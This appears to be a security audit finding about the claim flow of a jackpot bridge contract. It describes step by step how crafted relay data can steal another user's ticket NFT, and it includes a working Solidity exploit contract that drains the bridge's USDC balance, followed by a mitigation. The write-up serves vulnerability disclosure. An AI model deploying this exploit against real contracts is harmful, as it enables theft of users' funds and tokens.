There is a strict pre-balance and post-balance check, but this is not enough.

There is a clever attack path to steal any ticket from bridge during the claim.

The attack path is like the following:

Attacker has a winning ticket to claim on bridge
Attacker deploys a malicious contract exploit
Exploit contract implements IERC721Receiver and transfer USDC from bridge to itself on ERC721 received hook
Attacker submits malicious RelayTxData with the following config:
approveTo: exploit address
to: JackpotTicketNFT address
data: abi.encodeWithSignature("safeTransferFrom(address,address,uint256)", address(bridge), address(exploit), ticketIdToSteal)
Attacker signs mailcious data with their private key and claim winnings from the bridge.
Exploit contract code can be like the following:

contract BridgeExploit is IERC721Receiver {
    IERC20 USDC;
    address bridge;

    constructor(IERC20 _usdc, address _bridge) {
        USDC = _usdc;
        bridge = _bridge;
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4)
    {
        uint256 amount = USDC.balanceOf(bridge);
        USDC.transferFrom(bridge, address(this), amount);
        return this.onERC721Received.selector;
    }
}
So when the attacker claims their winning ticket with the above malicious RelayTxData, the following will happen during JackpotBridgeManager::_bridgeFunds:

Bridge will approve winning amount to exploit contract (L350)
Bridge will then transfer victim's NFT to exploit contract (L354 with malicious bridge detail)
exploit contract will transfer USDC from bridge to itself on ticket receive hook
The balance check will pass and the whole process succeeds (L359)
Recommended mitigation steps
Implement a blacklist mechanism. Don't allow bridge to call JackpotTicketNFT or any other jackpot system contracts during a claim.
